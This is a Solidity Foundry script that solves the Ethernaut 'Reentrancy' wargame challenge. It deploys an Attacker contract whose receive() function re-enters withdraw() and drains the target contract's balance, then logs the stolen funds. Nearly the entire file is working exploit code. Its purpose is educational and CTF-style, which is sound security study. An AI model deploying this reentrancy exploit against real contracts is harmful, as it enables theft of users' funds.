// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IReentrancy {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IReentrancy private reentrancy = IReentrancy(0xdFD1c8aB3BeFad6dCc46Cb6f9DE1Ef93bC4da47b);

    function withdraw(uint256 _amount) public {
        reentrancy.withdraw(_amount);
    }

    function withdrawFromContract(address _addr) external payable {
        (bool success, ) = _addr.call{value: address(this).balance}("");
        require(success, "call failed");
    }

    receive() external payable {
        uint256 amount = reentrancy.balanceOf(address(this));
        reentrancy.withdraw(amount);
    }
    
}

/// @author agadzhalov
/// @title Solution to Reentrancy Ethernaut challenge
/// @notice Solution:
///         1. Donate to the `Reentrancy` contract to bypass validation.
///         2. Call `withdraw()` to trigger the `receive()` function.
///         3. In the `receive()` function, call `withdraw()` again, draining all the funds.
contract ReentrancyScript is Script {
    /// @notice Instance of the `IReentrancy` contract to interact with.
    IReentrancy public reentrancy = IReentrancy(0xdFD1c8aB3BeFad6dCc46Cb6f9DE1Ef93bC4da47b);
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Log the balance of the Reentrancy contract before the attack
        console.log("1. Reentrancy balance:", address(reentrancy).balance);

        // Deploy the attacker contract and donate Ether to Reentrancy
        Attacker attacker = new Attacker();
        reentrancy.donate{value: 1e15}(address(attacker));

        // Trigger the withdrawal attack
        attacker.withdraw(1e15);

        // Log the balance of the Reentrancy contract after the attack
        console.log("2. Reentrancy balance after attack:", address(reentrancy).balance);

        // Log the attacker's balance to confirm the stolen funds
        console.log(address(attacker).balance);

        vm.stopBroadcast();
    }
}
